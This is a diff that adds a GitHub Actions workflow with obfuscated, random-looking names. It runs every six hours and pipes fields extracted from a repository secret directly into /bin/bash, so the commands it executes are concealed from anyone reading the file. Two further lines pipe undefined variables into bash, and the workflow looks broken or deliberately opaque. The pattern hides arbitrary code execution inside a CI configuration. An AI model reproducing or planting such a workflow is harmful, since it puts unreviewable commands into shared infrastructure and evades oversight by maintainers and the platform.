@@ -1,0 +1,20 @@
+name: zhengcunzai3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhengcunzai3456
+        env:
+          wuuzm04877: ${{ secrets.wuuzm04877 }}
+        run: |
+          echo $wuuzm04877 | jq -r .xjhe1 | /bin/bash
+          echo $a567 | jq -r .ussa497 | /bin/bash
+          echo $z3 | jq -r .l4 | /bin/bash
+
